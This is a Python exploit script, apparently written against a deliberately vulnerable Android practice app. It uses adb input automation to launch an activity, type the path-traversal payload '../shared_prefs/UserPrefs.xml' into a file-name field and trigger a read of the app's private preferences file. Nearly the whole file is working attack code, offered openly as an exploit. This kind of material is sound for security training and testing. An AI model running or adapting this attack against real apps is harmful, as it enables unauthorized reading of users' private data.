#!/usr/bin/env python3
import subprocess
import threading
import time
import sys

# Configuration
PACKAGE_NAME = "com.dlh.vulnerapp"
ACTIVITY_NAME = "com.dlh.vulnerapp.InsecureFileActivity"

# Payloads attempting to read UserPrefs from shared_prefs (which we know exists)
# In Android, app data is at /data/data/PKG/files (default for openFileInput)
# So '..' goes to /data/data/PKG/
# '../shared_prefs/UserPrefs.xml' should work.
PAYLOADS = [
    'Testing',
    '../shared_prefs/UserPrefs.xml'
]

def escape_for_adb_shell(text):
    """Escapes strings for ADB shell input text"""
    # Replace space with %s
    escaped = text.replace(" ", "%s")
    # Escape chars that confuse shell
    chars_to_escape = ['\\', '"', "'", '(', ')', '{', '}', '#', '&', ';', '|', '*', '$', '<', '>', '?']
    final_str = ""
    for char in escaped:
        if char in chars_to_escape:
            final_str += "\\" + char
        else:
            final_str += char
    return final_str

def run_adb_cmd(cmd_list):
    try:
        # print(f"[DEBUG] {' '.join(cmd_list)}")
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""

def main():
    print("=== Path Traversal Exploit (Robust) ===")
    
    # 1. Launch Activity
    print(f"[*] Launching {ACTIVITY_NAME}...")
    run_adb_cmd(['adb', 'shell', 'am', 'start', '-n', f"{PACKAGE_NAME}/{ACTIVITY_NAME}"])
    time.sleep(3)
    
    # 2. Focus Logic
    # We need to focus the EditText which is BELOW the first button.
    # TAB sequence: WriteButton -> FileNameInput -> ReadButton
    # Strategy: Tap middle-ish (safe guess) then use TAB if needed.
    # Layout suggests Button is top, Input is below.
    # Let's try Tapping Y=600 (Lower than previous attempts)
    print("[*] Setting Focus: Tapping Y=600...")
    run_adb_cmd(['adb', 'shell', 'input', 'tap', '500', '600']) 
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '122']) # MOVE_HOME
    
    # 3. Test Payloads
    for payload in PAYLOADS:
        print(f"\n[*] Testing Payload: {payload}")
        
        # RE-FOCUS INPUT! (Essential because previous iteration TABbed away)
        run_adb_cmd(['adb', 'shell', 'input', 'tap', '500', '600'])
        run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '122']) # MOVE_HOME
        
        # Clear Input
        run_adb_cmd(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_CTRL_Left', 'KEYCODE_A'])
        for _ in range(60):
             run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '67']) # DEL
             
        # Type Payload
        escaped = escape_for_adb_shell(payload)
        run_adb_cmd(['adb', 'shell', 'input', 'text', escaped])
        time.sleep(1)
        
        # Click Read Button
        # Logic: If we are in Input, TAB moves to ReadButton, ENTER clicks it.
        print("[*] Triggering Read (TAB + ENTER)...")
        run_adb_cmd(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_TAB'])
        time.sleep(0.5)
        run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '66']) # ENTER
        
        time.sleep(2)
        print("[*] Check device screen for content.")

if __name__ == "__main__":
    main()
